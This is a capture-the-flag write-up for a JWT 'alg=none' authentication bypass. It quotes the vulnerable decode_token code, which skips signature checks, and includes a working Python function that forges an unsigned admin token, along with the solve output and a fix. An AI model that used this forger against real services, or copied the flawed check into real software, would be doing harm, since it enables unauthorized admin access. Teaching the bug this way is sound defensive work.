# jwt-none-alg — Writeup

## The bug

Look at `decode_token()` in `app.py`:

```python
header = json.loads(b64url_decode(header_b64))
...
alg = header.get("alg", "")

if alg.lower() == "none":
    return payload   # <-- no signature check at all!

if alg == "HS256":
    ... verify HMAC ...
```

The server trusts the `alg` field from the **attacker-controlled** JWT
header to decide whether to verify a signature at all. This is the
real-world "alg=none" JWT vulnerability (CVE-class bug that hit several
JWT libraries in 2015 and keeps reappearing in hand-rolled
implementations): if we set `alg` to `"none"` in our own forged header,
the server skips verification and just trusts whatever payload we hand it.

## Steps

1. A JWT is `base64url(header) + "." + base64url(payload) + "." +
   base64url(signature)`.
2. Forge a header `{"alg": "none", "typ": "JWT"}` and a payload
   `{"username": "guest", "admin": true}`.
3. Base64url-encode both (no padding), join with `.`, and leave the
   signature segment **empty** (the conventional form for `alg=none`
   tokens): `header_b64.payload_b64.`
4. Send it as `Authorization: Bearer <forged token>` to `GET /admin`.
5. The server decodes the header, sees `alg == "none"`, skips signature
   verification, reads `admin: true` from our payload, and returns the
   flag.

```python
def forge_none_alg_token(username="guest", admin=True):
    header = {"alg": "none", "typ": "JWT"}
    payload = {"username": username, "admin": admin}
    header_b64 = b64url_encode(json.dumps(header).encode())
    payload_b64 = b64url_encode(json.dumps(payload).encode())
    return f"{header_b64}.{payload_b64}."
```

## Running it

```
$ python3 solve.py
flag{jwt_n0ne_alg_byp4ss_str1kes_ag41n}
```

`solve.py` boots `app.py` itself as a subprocess, forges the token, and
hits `/admin` over HTTP — the exact same request a player would send with
`curl`.

## Takeaway

Never let the token itself dictate which algorithm (or *whether*) to
verify a signature. A JWT library/server should pin the expected algorithm
server-side (e.g. always require and check HS256/RS256) and reject
anything else outright, rather than branching on the client-supplied
`alg` header.
